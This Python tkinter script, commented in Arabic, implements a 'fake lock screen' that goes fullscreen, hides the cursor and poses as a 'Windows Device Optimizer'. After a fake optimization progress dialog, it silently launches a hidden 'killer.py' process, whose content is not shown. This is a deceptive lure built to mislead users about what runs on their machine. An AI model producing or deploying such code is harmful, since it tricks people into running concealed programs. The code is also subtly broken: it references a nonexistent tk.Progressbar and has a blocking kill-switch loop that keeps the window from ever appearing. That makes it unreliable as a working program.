import tkinter as tk
from tkinter import messagebox, simpledialog
import os
import sys
import time
import threading
import subprocess

class FakeLockScreenApp:
    def __init__(self):
        self.root = None
        self.password_correct = "123456"  # كلمة المرور الافتراضية
        self.is_running = False
        
    def start(self):
        """تشغيل التطبيق"""
        self.root = tk.Tk()
        self.root.attributes('-fullscreen', True)
        self.root.configure(bg='#0a0a0a')
        self.root.bind('<Escape>', lambda e: self.exit_lockscreen())
        
        # إخفاء المؤشر
        self.root.config(cursor="none")
        
        # واجهة شاشة القفل الوهمية
        self.create_lock_screen()
        
        # تشغيل في الخلفية
        self.check_for_kill_switch()
        
        self.root.mainloop()
    
    def create_lock_screen(self):
        """إنشاء واجهة شاشة القفل"""
        bg_frame = tk.Frame(self.root, bg='#0a0a0a')
        bg_frame.pack(fill='both', expand=True)
        
        # شعار الهاتف الوهمي
        phone_icon = tk.Label(
            bg_frame, 
            text="📱", 
            font=("Segoe UI", 80), 
            fg="#ffffff"
        )
        phone_icon.pack(pady=(100, 20))
        
        # اسم الجهاز الوهمي
        device_name = tk.Label(
            bg_frame, 
            text="Windows Device Optimizer", 
            font=("Segoe UI", 24, "bold"), 
            fg="#ffffff"
        )
        device_name.pack(pady=(0, 10))
        
        # رسالة الحالة
        status_msg = tk.Label(
            bg_frame, 
            text="Your device needs optimization", 
            font=("Segoe UI", 14), 
            fg="#aaaaaa"
        )
        status_msg.pack(pady=(0, 40))
        
        # خانة إدخال كلمة المرور
        self.password_var = tk.StringVar()
        password_entry = tk.Entry(
            bg_frame, 
            textvariable=self.password_var, 
            show="*", 
            font=("Segoe UI", 16), 
            width=20,
            justify='center',
            bg='#1a1a1a',
            fg="#ffffff",
            insertbackground="#ffffff"
        )
        password_entry.pack(pady=(0, 20))
        password_entry.focus_set()
        
        # زر الدخول
        login_btn = tk.Button(
            bg_frame, 
            text="Optimize Now", 
            command=self.verify_password,
            font=("Segoe UI", 14, "bold"),
            bg="#0078d7",
            fg="#ffffff",
            activebackground="#005a9e",
            activeforeground="#ffffff",
            cursor="hand2",
            padx=30,
            pady=10
        )
        login_btn.pack(pady=(0, 20))
        
        # معلومات إضافية وهمية
        info_label = tk.Label(
            bg_frame, 
            text=f"System ID: {self.get_device_id()} | Storage: 42GB/64GB | RAM: 8GB", 
            font=("Segoe UI", 9), 
            fg="#666666"
        )
        info_label.pack(side='bottom', pady=20)
        
        # ربط مفتاح Enter
        password_entry.bind('<Return>', lambda e: self.verify_password())
        
        # تأثير نبض الخلفية
        self.pulse_background()
    
    def verify_password(self):
        """التحقق من كلمة المرور"""
        entered_password = self.password_var.get()
        
        if entered_password == self.password_correct:
            # كلمة المرور صحيحة - بدء عملية التحسين
            self.start_optimization_process()
        else:
            # كلمة مرور خاطئة
            self.password_var.set("")
            
            # اهتزاز الخانة
            self.shake_entry()
            
            # رسالة خطأ
            error_msg = tk.Label(
                self.root, 
                text="❌ Invalid Password!", 
                font=("Segoe UI", 12, "bold"), 
                fg="#ff4444"
            )
            error_msg.place(relx=0.5, rely=0.6, anchor='center')
            self.root.after(2000, lambda: error_msg.destroy())
    
    def shake_entry(self):
        """اهتزاز خانة الإدخال"""
        self.root.update()
        for i in range(5):
            self.root.geometry(f"+{i*2}+0")
            self.root.update()
            self.root.after(50)
        self.root.geometry("+0+0")
    
    def start_optimization_process(self):
        """بدء عملية التحسين"""
        # إنشاء ملف kill_switch.txt مسبقاً
        with open("kill_switch.txt", "w") as f:
            f.write("Ready to kill")
        
        # عرض رسالة التحسين
        dialog = tk.Toplevel(self.root)
        dialog.title("Optimizing...")
        dialog.geometry("400x200")
        dialog.configure(bg="#1a1a1a")
        dialog.transient(self.root)
        dialog.grab_set()
        
        title_label = tk.Label(
            dialog, 
            text="⚡ Optimizing Your Device...", 
            font=("Segoe UI", 16, "bold"), 
            fg="#00ff00",
            bg="#1a1a1a"
        )
        title_label.pack(pady=(20, 10))
        
        msg_label = tk.Label(
            dialog, 
            text="Please wait while we clean up your system.", 
            font=("Segoe UI", 12), 
            fg="#ffffff",
            bg="#1a1a1a"
        )
        msg_label.pack(pady=(0, 20))
        
        progress_bar = tk.Progressbar(dialog, mode='indeterminate', length=300)
        progress_bar.pack(pady=10)
        progress_bar.start(10)
        
        # بعد انتهاء المحاكاة، ابدأ القاتل
        dialog.after(3000, lambda: [dialog.destroy(), self.launch_killer()])
        
        progress_bar.start(10)
    
    def launch_killer(self):
        """إطلاق القاتل"""
        try:
            subprocess.Popen(["python", "killer.py"], creationflags=subprocess.CREATE_NO_WINDOW)
            print("🚀 Killer launched!")
        except Exception as e:
            print(f"❌ Error launching killer: {e}")
    
    def exit_lockscreen(self):
        """خروج من شاشة القفل"""
        self.root.quit()
        self.root.destroy()
    
    def pulse_background(self):
        """تأثير نبض الخلفية"""
        colors = ['#0a0a0a', '#0f0f0f', '#0a0a0a']
        idx = [0]
        
        def pulse():
            if self.root and self.is_running:
                self.root.configure(bg=colors[idx[0]])
                idx[0] = (idx[0] + 1) % len(colors)
                self.root.after(500, pulse)
        
        pulse()
    
    def get_device_id(self):
        """جلب معرف الجهاز"""
        try:
            import uuid
            return str(uuid.uuid4())[:8].upper()
        except:
            return "XXXX-XXXX"
    
    def check_for_kill_switch(self):
        """فحص ملف الإيقاف"""
        kill_file = "kill_switch.txt"
        
        def check_loop():
            while self.is_running:
                if os.path.exists(kill_file):
                    self.root.after(0, self.kill_app)
                    break
                self.root.after(1000, check_loop)
        
        check_loop()
    
    def kill_app(self):
        """إيقاف التطبيق بالقوة"""
        self.is_running = False
        if self.root:
            self.root.destroy()


# ==================== التشغيل الرئيسي ====================
if __name__ == "__main__":
    app = FakeLockScreenApp()
    app.is_running = True
    
    # بدء التطبيق
    print("=" * 50)
    print("🚀 SmartDeviceOptimizer - Starting...")
    print("=" * 50)
    print("💡 Hint: Press ESC to exit the lock screen")
    print("💡 To kill the app, create a file named 'kill_switch.txt'")
    print("=" * 50)
    
    app.start()